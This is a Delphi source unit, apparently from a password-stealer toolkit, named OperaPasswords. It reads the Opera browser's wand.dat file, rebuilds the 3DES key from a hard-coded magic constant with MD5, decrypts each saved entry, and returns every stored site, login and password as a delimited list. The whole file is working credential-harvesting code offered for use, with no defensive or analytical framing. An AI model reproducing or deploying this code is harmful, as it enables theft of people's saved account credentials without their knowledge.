Unit OperaPasswords;

interface

function GetOperaPasswords(WandFile: pWideChar; Delimitador: string): string;

implementation

uses
  StrUtils,windows,
  messages,
  GWinCryp;

type
  PHeaderWand = ^THeaderWand;
  THeaderWand = record
    szBlock: DWORD;
    szKey: DWORD;
    Key: array[0..7] of Byte;
  end;

var
  Resultado: string;

function OffsetMem(lpBase: Pointer; Offset: Cardinal): Pointer;
asm
  add eax,edx
end;

function Swap32(Value: LongWord): LongWord; assembler;
asm
  bswap eax
end;

function LastPos(Needle: Char; Haystack: String): integer;
begin
  for Result := Length(Haystack) downto 1 do if Haystack[Result] = Needle then Break;
end;

function GetHash(Data: Pointer; nSize: Cardinal; HashType: Cardinal): Pointer;
var
  hProv: HCRYPTPROV;
  hHash: HCRYPTHASH;
begin
  Result:= nil;
  if CryptAcquireContext(hProv, nil, nil, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT) then try
    if CryptCreateHash(hProv, HashType, 0, 0, hHash) then try
      if CryptHashData(hHash, Data, nSize, 0) then begin
        if CryptGetHashParam(hHash, HP_HASHVAL, nil, nSize, 0) then begin
          GetMem(Result,nSize);
          if not CryptGetHashParam(hHash, HP_HASHVAL, Result, nSize, 0) then begin
            FreeMem(Result);
            Result:= nil;
          end;
        end;
      end;
    finally
      CryptDestroyHash(hHash);
    end;
  finally
    CryptReleaseContext(hProv, 0);
  end;
end;

function GetMD5(Data: Pointer; nSize: Cardinal): Pointer;
begin
  Result:= GetHash(Data, nSize, CALG_MD5);
end;

function Decrypt3DES(Data, Key, IV: Pointer; var DataOut: Pointer; nSize: Cardinal): Pointer;
var
  hProv: HCRYPTPROV;
  hKey: HCRYPTKEY;
  keyHeader: TBLOBHeader;
  bKey: array[0..35] of Byte;
  desMode: DWORD;
begin
  Result:= nil;

  CryptAcquireContext(hProv, nil, nil, PROV_RSA_FULL, CRYPT_DELETEKEYSET);
  if CryptAcquireContext(hProv, nil, nil, PROV_RSA_FULL, CRYPT_NEWKEYSET) then try
    keyHeader.bType:= PLAINTEXTKEYBLOB;
    keyHeader.bVersion:= CUR_BLOB_VERSION;
    keyHeader.reserved:= 0;
    keyHeader.aiKeyAlg:= CALG_3DES;

    FillChar(bKey[0], SizeOf(bKey), 0);

    Move(keyHeader,bKey[0],SizeOf(keyHeader));

    bKey[SizeOf(keyHeader)]:= 24;

    Move(Key^, bKey[SizeOf(keyHeader)+4], 24);

    if CryptImportKey(hProv, @bKey[0],  sizeof(keyHeader) + sizeof(DWORD) + 24,  0,  0, hKey) then try
      //set DES mode
      desMode:= CRYPT_MODE_CBC;
      CryptSetKeyParam(hKey, KP_MODE, @desMode, 0);
      //set padding mode
      desMode:= ZERO_PADDING;
      CryptSetKeyParam(hKey, KP_PADDING, @desMode, 0);
      //set iv
      CryptSetKeyParam(hKey, KP_IV, IV, 0);
      desMode:= nSize;
      if not CryptDecrypt(hKey, 0, True, 0, data, nSize) then Result:= nil else begin
        Move(data^, DataOut^, desMode);
        Result:= DataOut;
      end;
    finally
      CryptDestroyKey(hKey);
    end;
  finally
    CryptReleaseContext(hProv, 0);
  end;
end;

procedure OperaDecrypt(key: Pointer; data, dataout: Pointer; len: Cardinal);
var
  out_1, out_2: array[0..63] of Byte;
  digest_1, digest_2: Pointer;
  des_key: array[0..23] of Byte;
const
  magic: array[0..10] of Byte = ($83, $7D, $FC, $0F, $8E, $B3, $E8, $69, $73, $AF, $FF);
  szMagic = SizeOf(magic);
begin
  Move(magic, out_1, szMagic);
  Move(key^, out_1[szMagic], 8);

  digest_1:= GetMD5(@out_1,szMagic + 8);
  Move(digest_1^, des_key, 16);
  Move(digest_1^, out_2, 16);
  Move(magic, out_2[16], szMagic);
  Move(key^, out_2[16 + szMagic], 8);
  
  digest_2:= GetMD5(@out_2,szMagic + 24);
  Move(digest_2^, des_key[16], 8);
  Decrypt3DES(data, @des_key, OffsetMem(digest_2, 8), dataout, len);

  FreeMem(digest_1);
  FreeMem(digest_2);
end;

function DecryptWandPass(const Key, Data: String): String;
begin
  Result := '';
  if Length(Key) <> 8 then Exit;
  if (Length(Data) < 8) or (Length(Data) mod 8 <> 0) then Exit;
  SetLength(Result, Length(Data));
  OperaDecrypt(@Key[1], @Data[1], @Result[1], Length(Data));
  SetLength(Result, Length(Result)- Ord(Result[Length(Result)]));
  Result:= WideCharToString(@(Result+#0#0)[1]); // Wide>ANSI
end;

procedure ParsingWandDat(WandDat: PWideChar);
var
  hFileMap, hFile: THandle;
  pData: Pointer;
  szFile, blockLength, wandOffset, dataLength: DWORD;
  Header: PHeaderWand;
  sKey, sData: String;
begin
  hFile:= CreateFileW(WandDat,
                      GENERIC_WRITE or GENERIC_READ,
                      FILE_SHARE_READ or FILE_SHARE_WRITE,
                      nil,
                      OPEN_EXISTING,
                      FILE_ATTRIBUTE_NORMAL,
                      0);

  if hFile <> INVALID_HANDLE_VALUE then
  begin
    szFile:= GetFileSize(hFile, nil);
    hFileMap:= CreateFileMappingA(hFile, nil, PAGE_READWRITE , 0, szFile, nil);
    if hFileMap <> INVALID_HANDLE_VALUE then
    begin
      CloseHandle(hFile);
      pData:= MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, szFile);
      if pData <> nil then
      try
        wandOffset:= 0;
        while (wandOffset < szFile) do
        begin
          while (wandOffset< szFile - 4) do
          begin
            if DWORD(OffsetMem(pData, wandOffset)^) = DWORD($08000000) then Break else wandOffset := wandOffset + 1; //Inc(i);
          end;
          Header:= OffsetMem(pData, wandOffset - 4);
          blockLength:= Swap32(Header^.szBlock);
          dataLength:= Swap32(Header^.szKey);
          SetLength(sKey, 8);
          SetLength(sData, blockLength - $10);
          CopyMemory(@sKey[1], @Header^.Key, 8);
          CopyMemory(@sData[1], OffsetMem(pData, wandOffset + $10), blockLength - $10);
          resultado := resultado + DecryptWandPass(sKey, sData) + #13#10;
          wandOffset:= wandOffset + dataLength + $10;
        end;
        finally
        UnmapViewOfFile(pData);
      end;
      CloseHandle(hFileMap);
    end;
  end;
end;

Function ReplaceString(ToBeReplaced, ReplaceWith : string; TheString :string):string;
var
  Position: Integer;
  LenToBeReplaced: Integer;
  TempStr: String;
  TempSource: String;
begin
  LenToBeReplaced:=length(ToBeReplaced);
  TempSource:=TheString;
  TempStr:='';
  repeat
    position := posex(ToBeReplaced, TempSource);
    if (position <> 0) then
    begin
      TempStr := TempStr + copy(TempSource, 1, position-1); //Part before ToBeReplaced
      TempStr := TempStr + ReplaceWith; //Tack on replace with string
      TempSource := copy(TempSource, position+LenToBeReplaced, length(TempSource)); // Update what's left
    end else
    begin
      Tempstr := Tempstr + TempSource; // Tack on the rest of the string
    end;
  until (position = 0);
  Result:=Tempstr;
end;

function GetOperaPasswords(WandFile: pWideChar; Delimitador: string): string;
var
  TempStr: string;
  site, login, pass: string;
begin
  resultado := '';
  TempStr := '';
  ParsingWandDat(WandFile);
  resultado := ReplaceString(#13#10#13#10, #13#10, resultado);
  if posex('Log profile', Resultado) > 0 then
  begin
    delete(resultado, 1, posex('Log profile', Resultado) + 12);

    while (posex('ftp://', resultado) <> 1) and
          (posex('*ftp://', resultado) <> 1) and
          (posex('http://', resultado) <> 1) and
          (posex('https://', resultado) <> 1) do
    if resultado = '' then break else delete(resultado, 1, 1);

    while resultado <> '' do
    begin
      site := Copy(resultado, 1, posex(#13#10, resultado) - 1);
      if posex('ftp://', site) > 0 then
      begin
        delete(resultado, 1, posex(#13#10, Resultado) + 1);
        login := Copy(resultado, 1, posex(#13#10, resultado) - 1);
        delete(resultado, 1, posex(#13#10, Resultado) + 1);
        pass := Copy(resultado, 1, posex(#13#10, resultado) - 1);
        delete(resultado, 1, posex(#13#10, Resultado) + 1);

        TempStr := TempStr + Site + Delimitador + login + Delimitador + Pass + Delimitador + #13#10;
      end else
      begin
        delete(resultado, 1, posex(#13#10, Resultado) + 1);
        delete(resultado, 1, posex(#13#10, Resultado) + 1);

        if (posex('ftp://', resultado) = 1) or
           (posex('*ftp://', resultado) = 1) or
           (posex('http://', resultado) = 1) or
           (posex('https://', resultado) = 1) then
        begin
          delete(resultado, 1, posex(#13#10, Resultado) + 1);
          delete(resultado, 1, posex(#13#10, Resultado) + 1);
        end else delete(resultado, 1, posex(#13#10, Resultado) + 1);

        if (posex('ftp://', resultado) = 1) or
           (posex('*ftp://', resultado) = 1) or
           (posex('http://', resultado) = 1) or
           (posex('https://', resultado) = 1) then
        begin
          delete(resultado, 1, posex(#13#10, Resultado) + 1);
          delete(resultado, 1, posex(#13#10, Resultado) + 1);
        end;

        login := Copy(resultado, 1, posex(#13#10, resultado) - 1);
        delete(resultado, 1, posex(#13#10, Resultado) + 1);
        delete(resultado, 1, posex(#13#10, Resultado) + 1);
        pass := Copy(resultado, 1, posex(#13#10, resultado) - 1);

        TempStr := TempStr + Site + Delimitador + login + Delimitador + Pass + Delimitador + #13#10;

        repeat
          delete(resultado, 1, 1);
        until (posex('ftp://', resultado) = 1) or
              (posex('http://', resultado) = 1) or
              (posex('https://', resultado) = 1) or
              (Length(resultado) = 0);
      end;
    end;
  end;
  result := TempStr;
end;

end.
